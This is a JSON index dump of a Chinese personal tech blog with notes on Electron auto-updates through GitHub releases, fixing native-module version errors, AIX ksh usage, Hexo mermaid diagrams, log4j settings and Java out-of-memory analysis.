更新方法","uri":"/blog/posts/Electron-Autoupdater-%E7%A8%8B%E5%BC%8F%E8%87%AA%E5%8B%95%E6%9B%B4%E6%96%B0%E6%96%B9%E6%B3%95-GITHUB-%E6%9B%B4%E6%96%B0%E6%96%B9%E6%B3%95/"},{"categories":["Nodejs"],"content":"相關爬的文章整理 Electron auto update introduction electron/update-electron-app: 🌲 A drop-in module that adds autoUpdating capabilities to Electron apps avocode/electron-windows-autoupdate: Get Electron AutoUpdater working on Windows electron-builder+electron-updater实现应用自动更新过程 - 简书 Electron應用使用electron-builder配合electron-updater實現自動更新 - SegmentFault 思否 注意：這個autoUpdater不是electron中的autoUpdater，是electron-updater的autoUpdater，否則坑你沒商量！ [ Day 35 ] - Electron 應用程式 - 更新自動化 ( 說明篇 ) - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天 electron-builder-auto-update-example/src at master · alondanoch/electron-builder-auto-update-example electron-autoupdate-scaffold/README.md at master · ganyouyin/electron-autoupdate-scaffold electron/code-signing.md at main · electron/electron [ Day 35 ] - Electron 應用程式 - 更新自動化 ( 說明篇 ) - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天 ","date":"2021-11-07","objectID":"/blog/posts/Electron-Autoupdater-%E7%A8%8B%E5%BC%8F%E8%87%AA%E5%8B%95%E6%9B%B4%E6%96%B0%E6%96%B9%E6%B3%95-GITHUB-%E6%9B%B4%E6%96%B0%E6%96%B9%E6%B3%95/:1:0","tags":["electron","autoupdater","github","action"],"title":"Electron Autoupdater 程式自動更新方法 \u0026 GITHUB 更新方法","uri":"/blog/posts/Electron-Autoupdater-%E7%A8%8B%E5%BC%8F%E8%87%AA%E5%8B%95%E6%9B%B4%E6%96%B0%E6%96%B9%E6%B3%95-GITHUB-%E6%9B%B4%E6%96%B0%E6%96%B9%E6%B3%95/"},{"categories":["Nodejs"],"content":"electron-builder autoupdater 一般更新 非常推薦看Electron自动更新 - 王叨叨(備份圖)這篇，裡面有詳細介紹各種寫法，還有demo。 使用 electron-builder 及 electron-updater 给项目配置自动更新_一片天空-CSDN博客 electron-updater更新electron应用程序 - 簡書 裡面還有提到electron-log日志，不知道有沒有機會使用到??? 這邊就直接用第一篇文章範例直接操作。 git clone wangdaodao/vue-electron-template 下來，裡面都已經設定好。 調整項目 vue.config.js 更新網址改成本機 IP 就可以更新。 dist_electron 改成 download HFS 更新，這邊你可以用其他 HTTP Server 都可以。 ","date":"2021-11-07","objectID":"/blog/posts/Electron-Autoupdater-%E7%A8%8B%E5%BC%8F%E8%87%AA%E5%8B%95%E6%9B%B4%E6%96%B0%E6%96%B9%E6%B3%95-GITHUB-%E6%9B%B4%E6%96%B0%E6%96%B9%E6%B3%95/:2:0","tags":["electron","autoupdater","github","action"],"title":"Electron Autoupdater 程式自動更新方法 \u0026 GITHUB 更新方法","uri":"/blog/posts/Electron-Autoupdater-%E7%A8%8B%E5%BC%8F%E8%87%AA%E5%8B%95%E6%9B%B4%E6%96%B0%E6%96%B9%E6%B3%95-GITHUB-%E6%9B%B4%E6%96%B0%E6%96%B9%E6%B3%95/"},{"categories":["Nodejs"],"content":"Github更新 Electron 程式 Publish - electron-builder 更新官方有幾種方式，有支援AWS空間，其中讓我感興趣是 github 。私有的專案也可以用的，但不知道會不會有什麼限制。文件有提到可以用 Github Actions 發布，我突然想到我的malagege/vue-electron-Pomodoro參考cawa-93/vite-electron-builder: Secure boilerplate for Electron app based on Vite. TypeScript + Vue/React/Angular/Svelte/Vanilla專案做的，裡面有設定 Github Actions。看文章說執行完會在 Github Release 建立草稿，我看之前專案有 build 成功過。 我看Release真的有建立。 題外話，這邊發現我Github Actions 後面都錯誤，但大概猜到是因為使用 desktop-idle 關係造成的，最後有排除。github actions 失敗問題 · malagege/vue-electron-Pomodoro@e3ffacf ~~最後排除掉，就是設定 provide 設定成 Github，其它要設定什麼，當出我也很疑惑，我這邊卡很久再研究文件，最後發現 Github Actions 會帶 github token ，也會帶 Repo 名稱參數，所以只要設設定設定 provide 設定成 Github。~~我怎麼沒先動手試試，這邊看了一段時間，哈哈。 我後來用沒設定前一版沒做 Github 設定，竟然會更新，太神奇了。可能 Action 那一段有做到更新。 electron.builder.config.js 打開舊版APP就會跳出更新就是成功了。這邊更新會等關掉程式後更新，還算滿人性化更新。另外，我參考原本程式就有做這段。 // Auto-updates if (import.meta.env.PROD) { app.whenReady() .then(() =\u003e import('electron-updater')) .then(({autoUpdater}) =\u003e autoUpdater.checkForUpdatesAndNotify()) .catch((e) =\u003e console.error('Failed check updates:', e)); } Creating and deploying an auto-updating Electron app for Mac and Windows using electron-builder | by John Dyer | Medium ","date":"2021-11-07","objectID":"/blog/posts/Electron-Autoupdater-%E7%A8%8B%E5%BC%8F%E8%87%AA%E5%8B%95%E6%9B%B4%E6%96%B0%E6%96%B9%E6%B3%95-GITHUB-%E6%9B%B4%E6%96%B0%E6%96%B9%E6%B3%95/:2:1","tags":["electron","autoupdater","github","action"],"title":"Electron Autoupdater 程式自動更新方法 \u0026 GITHUB 更新方法","uri":"/blog/posts/Electron-Autoupdater-%E7%A8%8B%E5%BC%8F%E8%87%AA%E5%8B%95%E6%9B%B4%E6%96%B0%E6%96%B9%E6%B3%95-GITHUB-%E6%9B%B4%E6%96%B0%E6%96%B9%E6%B3%95/"},{"categories":["Nodejs"],"content":"手動執行更新 Electron 十问十答（2） | Beace Blog [electron]終極奧義 五千字教程丟給你 - IT閱讀 Electron应用实现自动更新 - 知乎 Electron Auto-Updater via Renderer (Frontend) Manipulation | by Meriç Melike Yılmaz | Medium electron + nodejs (热更新)_这么近又那么远的博客-CSDN博客 大部分教學都沒有用 bridge 串，所以必須用 ipcmain 去接收是否要做更新。 通過選單更新electron-builder/encapsulated manual update via menu.js at a94532164709a545c0f6551fdc336dbc5377bda8 · electron-userland/electron-builder · GitHub ","date":"2021-11-07","objectID":"/blog/posts/Electron-Autoupdater-%E7%A8%8B%E5%BC%8F%E8%87%AA%E5%8B%95%E6%9B%B4%E6%96%B0%E6%96%B9%E6%B3%95-GITHUB-%E6%9B%B4%E6%96%B0%E6%96%B9%E6%B3%95/:3:0","tags":["electron","autoupdater","github","action"],"title":"Electron Autoupdater 程式自動更新方法 \u0026 GITHUB 更新方法","uri":"/blog/posts/Electron-Autoupdater-%E7%A8%8B%E5%BC%8F%E8%87%AA%E5%8B%95%E6%9B%B4%E6%96%B0%E6%96%B9%E6%B3%95-GITHUB-%E6%9B%B4%E6%96%B0%E6%96%B9%E6%B3%95/"},{"categories":["Nodejs"],"content":"了解 AutoUpdater 函式/事件 ","date":"2021-11-07","objectID":"/blog/posts/Electron-Autoupdater-%E7%A8%8B%E5%BC%8F%E8%87%AA%E5%8B%95%E6%9B%B4%E6%96%B0%E6%96%B9%E6%B3%95-GITHUB-%E6%9B%B4%E6%96%B0%E6%96%B9%E6%B3%95/:4:0","tags":["electron","autoupdater","github","action"],"title":"Electron Autoupdater 程式自動更新方法 \u0026 GITHUB 更新方法","uri":"/blog/posts/Electron-Autoupdater-%E7%A8%8B%E5%BC%8F%E8%87%AA%E5%8B%95%E6%9B%B4%E6%96%B0%E6%96%B9%E6%B3%95-GITHUB-%E6%9B%B4%E6%96%B0%E6%96%B9%E6%B3%95/"},{"categories":["Nodejs"],"content":"事件(Event) error 中間發生錯誤觸發 error Event。 checking-for-update 更新開始後，馬上觸發這個 Event。 update-available 檢查到可以更新後，觸發這個 Event。如果autoDownload設定 true將會自動下載更新程式。 參數: info UpdateInfo (for generic and github providers) | VersionInfo (for Bintray provider) update-not-available 沒有檢查到更新，觸發這個 Event。 download-progress 下載時候觸發Event? update-downloaded 下載完成觸發Event。 ","date":"2021-11-07","objectID":"/blog/posts/Electron-Autoupdater-%E7%A8%8B%E5%BC%8F%E8%87%AA%E5%8B%95%E6%9B%B4%E6%96%B0%E6%96%B9%E6%B3%95-GITHUB-%E6%9B%B4%E6%96%B0%E6%96%B9%E6%B3%95/:4:1","tags":["electron","autoupdater","github","action"],"title":"Electron Autoupdater 程式自動更新方法 \u0026 GITHUB 更新方法","uri":"/blog/posts/Electron-Autoupdater-%E7%A8%8B%E5%BC%8F%E8%87%AA%E5%8B%95%E6%9B%B4%E6%96%B0%E6%96%B9%E6%B3%95-GITHUB-%E6%9B%B4%E6%96%B0%E6%96%B9%E6%B3%95/"},{"categories":["Nodejs"],"content":"Method checkForUpdates ⇒ Promise\u003cUpdateCheckResult\u003e 請求Server看是不是有更新。 checkForUpdatesAndNotify ⇒ Promise\u003cUpdateCheckResult\u003e(重點) 請求Server看是不是有更新，有的畫自動更新和發送通知。 Call autoUpdater.checkForUpdatesAndNotify(). Or, if you need custom behaviour, implement electron-updater events, check examples below. 這邊特別說明一下，下面通知是寫死固定，原本看文件以為沒辦法調整，不過看源碼可以帶參數修正文字訊息。 if (import.meta.env.PROD) { app.whenReady() .then(() =\u003e import('electron-updater')) .then(({autoUpdater}) =\u003e autoUpdater.checkForUpdatesAndNotify({ title: '程式已經準備好更新', body: `{appName} 版本 {version} 已經下載完成，重開應用程式可進行安裝`, })) .catch((e) =\u003e console.error('Failed check updates:', e)); } electron-builder/AppUpdater.ts at f45110cbf66572d5748d21fc24dc26cabd06f35f · electron-userland/electron-builder 彩蛋錯誤 ipcMain.on('check-update', function(){ // import {checkForUpdates} from './updater.js'; // 會發生 error Parsing error: 'import' and 'export' may only appear at the top level (() =\u003e import('./updater.js'))().then(({checkForUpdates})=\u003e checkForUpdates()); }); vue CLI异步组件报错import’ and ’export’ may only appear at the top level_郑伟斌的博客-CSDN博客 這篇有空再整理 import 用法(有時間的話，哈哈) downloadUpdate autoDownload = false 自動下載關閉，可以使用這個method下載。 getFeedURL 設定 update provider quitAndInstall appUpdater.quitAndInstall(isSilent, isForceRunAfter) 關閉程式並且更新。 Restarts the app and installs the update after it has been downloaded. It should only be called after update-downloaded has been emitted. Note: Like Electron’s built-in quitAndInstall method, autoUpdater.quitAndInstall() will close all application windows first and only emit before-quit event on app after that. This is different from the normal quit event sequence (i.e. not during an update). As a result you should listen to Electron’s before-quit-for-update event (on electron.autoUpdater) if you wish to perform actions before the windows are closed while a process is quitting, as well as listening to before-quit. However, that is not the case for the (Windows) NSIS or (Linux) AppImage targets. The before-quit-for-update event is not emitted. The before-quit event is emitted first, then windows will be closed. isSilent Boolean - windows-only Runs the installer in silent mode. Defaults to false. isForceRunAfter Boolean - Run the app after finish even on silent install. Not applicable for macOS. Ignored if isSilent is set to false. ","date":"2021-11-07","objectID":"/blog/posts/Electron-Autoupdater-%E7%A8%8B%E5%BC%8F%E8%87%AA%E5%8B%95%E6%9B%B4%E6%96%B0%E6%96%B9%E6%B3%95-GITHUB-%E6%9B%B4%E6%96%B0%E6%96%B9%E6%B3%95/:4:2","tags":["electron","autoupdater","github","action"],"title":"Electron Autoupdater 程式自動更新方法 \u0026 GITHUB 更新方法","uri":"/blog/posts/Electron-Autoupdater-%E7%A8%8B%E5%BC%8F%E8%87%AA%E5%8B%95%E6%9B%B4%E6%96%B0%E6%96%B9%E6%B3%95-GITHUB-%E6%9B%B4%E6%96%B0%E6%96%B9%E6%B3%95/"},{"categories":["Nodejs"],"content":"結論 本篇採用 electron-builder 簡單實作用 Github 手動/自動更新程式，這邊設定只是基本調整，其實還有滿多東西沒有整理出來，因為是簡單研究，所以就打算繼續深入，相信以後專案需要做單機版我就可以考慮採用這方案去進行。 ","date":"2021-11-07","objectID":"/blog/posts/Electron-Autoupdater-%E7%A8%8B%E5%BC%8F%E8%87%AA%E5%8B%95%E6%9B%B4%E6%96%B0%E6%96%B9%E6%B3%95-GITHUB-%E6%9B%B4%E6%96%B0%E6%96%B9%E6%B3%95/:4:3","tags":["electron","autoupdater","github","action"],"title":"Electron Autoupdater 程式自動更新方法 \u0026 GITHUB 更新方法","uri":"/blog/posts/Electron-Autoupdater-%E7%A8%8B%E5%BC%8F%E8%87%AA%E5%8B%95%E6%9B%B4%E6%96%B0%E6%96%B9%E6%B3%95-GITHUB-%E6%9B%B4%E6%96%B0%E6%96%B9%E6%B3%95/"},{"categories":["Outlook"],"content":"公司常常寄資安信，有時為了刪除就會點到，就會有紀錄，最近找到方法用「純文字」去開信，就不會有這個問題。 ","date":"2021-11-07","objectID":"/blog/posts/Outlook-%E8%A8%AD%E5%AE%9A%E7%B4%94%E6%96%87%E5%AD%97%E9%A0%90%E8%A6%BD/:0:0","tags":["outlook"],"title":"Outlook 設定純文字預覽","uri":"/blog/posts/Outlook-%E8%A8%AD%E5%AE%9A%E7%B4%94%E6%96%87%E5%AD%97%E9%A0%90%E8%A6%BD/"},{"categories":["Outlook"],"content":"設定流程 ","date":"2021-11-07","objectID":"/blog/posts/Outlook-%E8%A8%AD%E5%AE%9A%E7%B4%94%E6%96%87%E5%AD%97%E9%A0%90%E8%A6%BD/:1:0","tags":["outlook"],"title":"Outlook 設定純文字預覽","uri":"/blog/posts/Outlook-%E8%A8%AD%E5%AE%9A%E7%B4%94%E6%96%87%E5%AD%97%E9%A0%90%E8%A6%BD/"},{"categories":["Java"],"content":"最近案子 User 不想看到這一串log，我就查詢有沒有不要顯示方法，最後找到記錄一下。 log4j 關掉 log4j.logger.org.springframework.beans.factory.support.DefaultListableBeanFactory=ERROR ","date":"2021-11-07","objectID":"/blog/posts/log4j-%E9%97%9C%E6%8E%89%E4%B8%8D%E6%83%B3%E8%A6%81%E7%9C%8B%E7%9A%84-log/:0:0","tags":["java","log4j"],"title":"log4j 關掉不想要看的 log","uri":"/blog/posts/log4j-%E9%97%9C%E6%8E%89%E4%B8%8D%E6%83%B3%E8%A6%81%E7%9C%8B%E7%9A%84-log/"},{"categories":["Linux"],"content":"錯誤不會中斷。 #!/bin/sh set -e 解決方法十分簡單, 只要加上 “set -e” 一行, 那麼 Shell Script 執行指令遇到錯誤時, 便會立即終止執行, 並自動退出離開, 參考:Shell Script 遇到錯誤時自動退出離開 ","date":"2021-11-07","objectID":"/blog/posts/Shell-Script-%E9%8C%AF%E8%AA%A4%E4%B8%AD%E6%96%B7%E6%96%B9%E6%B3%95/:0:0","tags":["shell"],"title":"Shell Script 錯誤中斷方法","uri":"/blog/posts/Shell-Script-%E9%8C%AF%E8%AA%A4%E4%B8%AD%E6%96%B7%E6%96%B9%E6%B3%95/"},{"categories":["Nodejs"],"content":"最近在重製番茄鐘，原本之前串接electron使用winapi筆記 | 程式狂想筆記，想說之前做過，最後在做這個，今天串接 Desktop-Idle 發生問題，發了一些時間處理。 都忘記當初有用 VM 跑做這段😅 npm install --global --production windows-build-tools 最後沒安裝成功，直接跑去手動安裝。於是遇到標題問題。 這個錯誤很多網站解法都無法修正，也許這個方法不一定會成功，但希望能幫到大家。 這問題是甚麼原因我還沒釐清楚 下午11:48:29 [main] Error: The module '\\\\?\\F:\\vue-electron-Pomodoro\\node_modules\\desktop-idle\\build\\Release\\desktopIdle.node' was compiled against a different Node.js version using NODE_MODULE_VERSION 93. This version of Node.js requires NODE_MODULE_VERSION 89. Please try re-compiling or re-installing the module (for instance, using `npm rebuild` or `npm install`). at process.func [as dlopen] (electron/js2c/asar_bundle.js:5:1846) at Object.Module._extensions..node (internal/modules/cjs/loader.js:1143:18) at Object.func [as .node] (electron/js2c/asar_bundle.js:5:1846) at Module.load (internal/modules/cjs/loader.js:940:32) at Module._load (internal/modules/cjs/loader.js:781:14) at Function.f._load (electron/js2c/asar_bundle.js:5:12913) at Module.require (internal/modules/cjs/loader.js:964:19) at require (internal/modules/cjs/helpers.js:88:18) at Object.\u003canonymous\u003e (F:\\vue-electron-Pomodoro\\node_modules\\desktop-idle\\index.js:1:21) at Module._compile (internal/modules/cjs/loader.js:1083:30) 解決方案參考: https://github.com/serialport/node-serialport/issues/1910#issuecomment-524949720 Steps: 1. If you have not installed electron-rebuild just install it with the command: npm i -D electron-rebuild 2. Remove from the node-modules folder the serialport and @serialport folders. 3. Remove the file packages-lock.json 4. Run npm i to install non-installed modules And finally run ./node_modules/.bin/electron-rebuild It is very important to run ./node_modules/.bin/electron-rebuild directly after npm i. 簡單來說就是 刪除 node-modules 刪除 packages-lock.json npm install 確認 package.json 有無加 version (原因如下) ./node_modules/.bin/electron-rebuild 要確定 package.json 原因 package.json 補上 version，就可以順利執行。 npm run watch 執行就可以正常開啟。 目前猜測是跟electron-builder 有關係，但為什麼執行./node_modules/.bin/electron-rebuild就可以跑?感覺跟Elecgtron 編譯環境有關係的樣子。 找了很多篇無法成功，我還以為無法突破這個錯誤😬😬😬，好險解決了。 環境 | Electron + Python + Vue. 採坑筆記 | by d.l.spm | Medium ","date":"2021-11-07","objectID":"/blog/posts/was-compiled-against-a-different-Node-js-version-using-NODE-MODULE-VERSION-93-This-version-of-Node-js-requires-NODE-MODULE-VERSION-89/:0:0","tags":["nodejs","electron","winapi"],"title":"was compiled against a different Node.js version using NODE_MODULE_VERSION 93. This version of Node.js requires NODE_MODULE_VERSION 89.","uri":"/blog/posts/was-compiled-against-a-different-Node-js-version-using-NODE-MODULE-VERSION-93-This-version-of-Node-js-requires-NODE-MODULE-VERSION-89/"},{"categories":["Nodejs"],"content":"Github Action遇到錯誤 安裝跑出一樣的問題。./node_modules/.bin/electron-rebuild不能執行，最後下npx electron-rebuild就可以跑了。 排除 was compiled against a different Node.js version using NODE_MODUL… · malagege/vue-electron-Pomodoro@13ebc90 ","date":"2021-11-07","objectID":"/blog/posts/was-compiled-against-a-different-Node-js-version-using-NODE-MODULE-VERSION-93-This-version-of-Node-js-requires-NODE-MODULE-VERSION-89/:1:0","tags":["nodejs","electron","winapi"],"title":"was compiled against a different Node.js version using NODE_MODULE_VERSION 93. This version of Node.js requires NODE_MODULE_VERSION 89.","uri":"/blog/posts/was-compiled-against-a-different-Node-js-version-using-NODE-MODULE-VERSION-93-This-version-of-Node-js-requires-NODE-MODULE-VERSION-89/"},{"categories":["nodejs"],"content":"我最近做 Electron 專案有用到 win32api，在Github Action編譯會卡住，原因不明，不過有找到解決方法。 細說我 Github Actions 狀況是跑到一半卡住，Action 會一直運行，想說放著讓他跑，但沒想到沒有成功，超過6小時 Github Action 把他關掉了。 解決方法參考:Electron-builder keeps rebuilding native dependency · Issue #5386 · electron-userland/electron-builder You can disable rebuilding with npmRebuild: ‘false’ in the config - but it would definitely be ideal if Electron-Builder could detect the need and rebuild only if needed. We ended up disabling it, but that has its own issues like accidentally building with broken node deps. 設定加了這段真的可以跑。 npmRebuild: 'false' GITHUB ACTION 應該就能順利。祝大家都順利。 ","date":"2021-11-07","objectID":"/blog/posts/Github-Actions-rebuild-native-dependencies-%E6%9C%83%E5%8D%A1%E4%BD%8F%E5%95%8F%E9%A1%8C/:0:0","tags":["nodejs","github","action"],"title":"Github Actions  rebuild native dependencies 會卡住問題","uri":"/blog/posts/Github-Actions-rebuild-native-dependencies-%E6%9C%83%E5%8D%A1%E4%BD%8F%E5%95%8F%E9%A1%8C/"},{"categories":["Aix"],"content":"最近做某個專案主機是用AIX，裡面的 command line 跟以往的 Bash 不一樣，沒有 autocompute 功能，也沒有 bash 上下找 History 功能。有時按方向鍵反而不是我想要的結果，搜尋一下，才發現使用操作上跟 vi 一樣。 簡單說一下 AIX，是一個 UNIX 系統，功能比 Linux 少很多功能樣子，使用上跟 Bash 差很多，沒 watch, top …等等功能，真的不習慣。 ","date":"2021-10-09","objectID":"/blog/posts/AIX-ksh-%E6%93%8D%E4%BD%9C%E5%B0%8F%E8%A8%98/:0:0","tags":["aix","ksh"],"title":"AIX(ksh) 操作小記","uri":"/blog/posts/AIX-ksh-%E6%93%8D%E4%BD%9C%E5%B0%8F%E8%A8%98/"},{"categories":["Aix"],"content":"模式切換到 vi 按裝預設可能不是設定 vi，可以設定到 .profile set -o vi How to invoke ESC+K ","date":"2021-10-09","objectID":"/blog/posts/AIX-ksh-%E6%93%8D%E4%BD%9C%E5%B0%8F%E8%A8%98/:0:1","tags":["aix","ksh"],"title":"AIX(ksh) 操作小記","uri":"/blog/posts/AIX-ksh-%E6%93%8D%E4%BD%9C%E5%B0%8F%E8%A8%98/"},{"categories":["Aix"],"content":"anything is vi command line 操做方向都是 hjkl(左下上右)。 有查到網路上看查歷史使用ESC+K(上)+ESC+J(下)。 正常方向鍵都不能使用，跟第一點hjkl(左下上右)操做是一樣的。 插入打字是a,i,r(跟 vi 打字一模一樣)。 vi/vim delete commands and examples | alvinalexander.com ","date":"2021-10-09","objectID":"/blog/posts/AIX-ksh-%E6%93%8D%E4%BD%9C%E5%B0%8F%E8%A8%98/:0:2","tags":["aix","ksh"],"title":"AIX(ksh) 操作小記","uri":"/blog/posts/AIX-ksh-%E6%93%8D%E4%BD%9C%E5%B0%8F%E8%A8%98/"},{"categories":["Aix"],"content":"ksh 版本 WIN-A5LTRLM4VQ5:/mnt/c/Users/Administrator$ ksh Command 'ksh' not found, but can be installed with: sudo apt install ksh # version 2020.0.0-5, or sudo apt install ksh93 # version 93u+20120801-7 sudo apt install mksh # version 58-1 How To: Find Out KSH ( Korn Shell ) Version on Linux or Unix-like system - nixCraft aix 好像是用ksh93。 ","date":"2021-10-09","objectID":"/blog/posts/AIX-ksh-%E6%93%8D%E4%BD%9C%E5%B0%8F%E8%A8%98/:0:3","tags":["aix","ksh"],"title":"AIX(ksh) 操作小記","uri":"/blog/posts/AIX-ksh-%E6%93%8D%E4%BD%9C%E5%B0%8F%E8%A8%98/"},{"categories":["Aix"],"content":"auto completion 找了很多篇，沒特別說明，剛好翻到這篇Tab Completion - Shell Scripting: Expert Recipes for Linux, Bash, and More [Book] ，原來是這樣用的orz。 ksh$ ca\u003cTAB\u003e\u003cTAB\u003e 1) /usr/bin/cancel 2) /usr/bin/callgrind_annotate 3) /usr/bin/cameratopam 4) /usr/bin/callgrind_control 5) /usr/bin/cancel.cups 6) /usr/bin/cal 7) /usr/bin/captoinfo 8) /usr/bin/catchsegv 9) /usr/bin/card 10) /usr/sbin/cacertdir_rehash 11) /usr/sbin/callback 12) /bin/cat 6\u003cTAB\u003e ksh$ /usr/bin/cal March 2011 Su Mo Tu We Th Fr Sa 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 $ ksh$ cat /etc/host\u003cTAB\u003e\u003cTAB\u003e 1) host.conf 2) hosts 3) hosts.allow 4) hosts.deny 4\u003cTAB\u003e ksh$ cat /etc/hosts.deny https://ngelinux.com/aix-korn-shell-how-to-set-tab-auto-completion-and-hostname-present-working-directory-path-in-the-terminalps1-variable/ ","date":"2021-10-09","objectID":"/blog/posts/AIX-ksh-%E6%93%8D%E4%BD%9C%E5%B0%8F%E8%A8%98/:0:4","tags":["aix","ksh"],"title":"AIX(ksh) 操作小記","uri":"/blog/posts/AIX-ksh-%E6%93%8D%E4%BD%9C%E5%B0%8F%E8%A8%98/"},{"categories":["Aix"],"content":"公司使用 ksh tab 沒有反應 使用 ksh93 就能用，位置在/usr/bin/ksh93 https://ngelinux.com/aix-korn-shell-how-to-set-tab-auto-completion-and-hostname-present-working-directory-path-in-the-terminalps1-variable/ ","date":"2021-10-09","objectID":"/blog/posts/AIX-ksh-%E6%93%8D%E4%BD%9C%E5%B0%8F%E8%A8%98/:0:5","tags":["aix","ksh"],"title":"AIX(ksh) 操作小記","uri":"/blog/posts/AIX-ksh-%E6%93%8D%E4%BD%9C%E5%B0%8F%E8%A8%98/"},{"categories":["Aix"],"content":"實用指令 AIX中的进程管理 - 春风亭牛二哥 - 博客园備份圖 Canceling a background job - IBM Documentation less -\u003e cat, view ","date":"2021-10-09","objectID":"/blog/posts/AIX-ksh-%E6%93%8D%E4%BD%9C%E5%B0%8F%E8%A8%98/:1:0","tags":["aix","ksh"],"title":"AIX(ksh) 操作小記","uri":"/blog/posts/AIX-ksh-%E6%93%8D%E4%BD%9C%E5%B0%8F%E8%A8%98/"},{"categories":["Aix"],"content":"/dev/null AIX 根目录满了，发现/DEV/null 2\u003e\u00261文件很大，如何删除-CSDN社区 ","date":"2021-10-09","objectID":"/blog/posts/AIX-ksh-%E6%93%8D%E4%BD%9C%E5%B0%8F%E8%A8%98/:2:0","tags":["aix","ksh"],"title":"AIX(ksh) 操作小記","uri":"/blog/posts/AIX-ksh-%E6%93%8D%E4%BD%9C%E5%B0%8F%E8%A8%98/"},{"categories":["Aix"],"content":"aix 其他指令 超詳細的AIX系統命令總結（慎重執行） - 每日頭條 ","date":"2021-10-09","objectID":"/blog/posts/AIX-ksh-%E6%93%8D%E4%BD%9C%E5%B0%8F%E8%A8%98/:3:0","tags":["aix","ksh"],"title":"AIX(ksh) 操作小記","uri":"/blog/posts/AIX-ksh-%E6%93%8D%E4%BD%9C%E5%B0%8F%E8%A8%98/"},{"categories":["Aix"],"content":"參考來源 Linux-shell-完全詳解命令_Linux Linux-shell-完全詳解 命令用法详解： aix auto-completion, command history function (finishing)(Others-Community) set -o vi AIX下shell - 周人假的 - 博客园 XXOOXp: AIX版的Linux watch指令…(監控指令的輸出狀態) AIX ksh使用小技巧_wujay-CSDN博客 ","date":"2021-10-09","objectID":"/blog/posts/AIX-ksh-%E6%93%8D%E4%BD%9C%E5%B0%8F%E8%A8%98/:3:1","tags":["aix","ksh"],"title":"AIX(ksh) 操作小記","uri":"/blog/posts/AIX-ksh-%E6%93%8D%E4%BD%9C%E5%B0%8F%E8%A8%98/"},{"categories":["Aix"],"content":"中文亂碼 locale 結果看到不是使用 Big5，所以終端機記得要調 big5。 括號要加跳脫字元!!跟 AIX 沒什麼關係。 在 Korn shell 或 POSIX shell 中以引號括住字元 - IBM Documentation ","date":"2021-10-09","objectID":"/blog/posts/AIX-ksh-%E6%93%8D%E4%BD%9C%E5%B0%8F%E8%A8%98/:4:0","tags":["aix","ksh"],"title":"AIX(ksh) 操作小記","uri":"/blog/posts/AIX-ksh-%E6%93%8D%E4%BD%9C%E5%B0%8F%E8%A8%98/"},{"categories":["Hexo"],"content":"原本參考Hexo中插入mermaid diagrams | Yu’s Notes，不過做到一半還是失敗。最後還是解決了，順便紀錄一下。 ","date":"2021-10-09","objectID":"/blog/posts/Hexo-Next-theme-%E5%8A%A0%E5%85%A5-mermaid-%E5%9C%96%E7%A4%BA-Diagrams/:0:0","tags":["hexo","mermaid"],"title":"Hexo Next theme 加入 mermaid 圖示(Diagrams)","uri":"/blog/posts/Hexo-Next-theme-%E5%8A%A0%E5%85%A5-mermaid-%E5%9C%96%E7%A4%BA-Diagrams/"},{"categories":["Hexo"],"content":"使用 Next 裡面設定好的 mermaid theme/next-reloaded/_config.yaml mermaid: enable: true # Available themes: default | dark | forest | neutral theme: forest 可以參考Mermaid | NexT {% mermaid sequenceDiagram %} Alice-\u003eJohn: Hello John, how are you? loop every minute John--\u003eAlice: Great! end {% endmermaid %} sequenceDiagram Alice-\u003eJohn: Hello John, how are you? loop every minute John--\u003eAlice: Great! end {% mermaid graph TD %} A--\u003eB; A--\u003eC; B--\u003eD; C--\u003eD; {% endmermaid %} graph TD A--\u003eB; A--\u003eC; B--\u003eD; C--\u003eD; 下面可以不用看了!! 下面可以不用看了!! 下面可以不用看了!! ","date":"2021-10-09","objectID":"/blog/posts/Hexo-Next-theme-%E5%8A%A0%E5%85%A5-mermaid-%E5%9C%96%E7%A4%BA-Diagrams/:1:0","tags":["hexo","mermaid"],"title":"Hexo Next theme 加入 mermaid 圖示(Diagrams)","uri":"/blog/posts/Hexo-Next-theme-%E5%8A%A0%E5%85%A5-mermaid-%E5%9C%96%E7%A4%BA-Diagrams/"},{"categories":["Hexo"],"content":"失敗安裝紀錄 先commit 現有 hexo GIT專案，防止壞掉可以還原。 npm install hexo-filter-mermaid-diagrams 先前使用Hexo NexT 主題遇到連結 %20 空白問題，新版設定 Google Adsense 方法 | 程式狂想筆記，所以在加入 HTML 程式做調整。我先前使用 njk，這樣我程式碼不用改在 theme 裡面。 官方都有提供對應程式碼調整，參考如下圖。 theme/next/_config.yaml 下面 footer 請打開 custom_file_path: #head: source/_data/head.swig header: source/_data/header.njk sidebar: source/_data/sidebar.njk postMeta: source/_data/post-meta.njk postBodyEnd: source/_data/post-body-end.njk footer: source/_data/footer.njk #bodyEnd: source/_data/body-end.swig #variable: source/_data/variables.styl #mixin: source/_data/mixins.styl #style: source/_data/styles.styl 失敗的話，我也是這樣QQ 不過後來發現原本 Next 就有支援了。 ","date":"2021-10-09","objectID":"/blog/posts/Hexo-Next-theme-%E5%8A%A0%E5%85%A5-mermaid-%E5%9C%96%E7%A4%BA-Diagrams/:2:0","tags":["hexo","mermaid"],"title":"Hexo Next theme 加入 mermaid 圖示(Diagrams)","uri":"/blog/posts/Hexo-Next-theme-%E5%8A%A0%E5%85%A5-mermaid-%E5%9C%96%E7%A4%BA-Diagrams/"},{"categories":["Java"],"content":"最近接的案子城市遇到OOM，但有時候要判斷程式是哪邊造成的，需要一些工具。但詳細還是要看log，說不定發生大量查詢資料地方。 java.lang.OutOfMemoryError Java heap space? 怎麼解? - 技術雜記 Technology Notes - Jack Yu | 傑克備份圖 AIX 不會產生 phrof 工具，產生 phd 檔案。跑在分析工具不能跑。最後找了很久發現要用 IBM HeapAnalyzer。 Java 執行緒究竟佔用多少記憶體_ImportNew - 微文庫 Capturing a Java Thread Dump | Baeldung 保姆級教學，22張圖揭開ThreadLocal_程式猿阿星 - MdEditor .phd 檔案 IBM HeapAnalyzer IBM HeapAnalyzer 可惜不知道哪個 Class發生錯誤，但可以找對應資料和log錯誤地方找是哪邊出問題。原本這支程式MQ進來會開對應Class執行緒去執行，因為同時間跑的程式有兩隻，最後有一隻會撈大量資料，導致JVM RAM 暴掉。最後把這個排程先移出去。 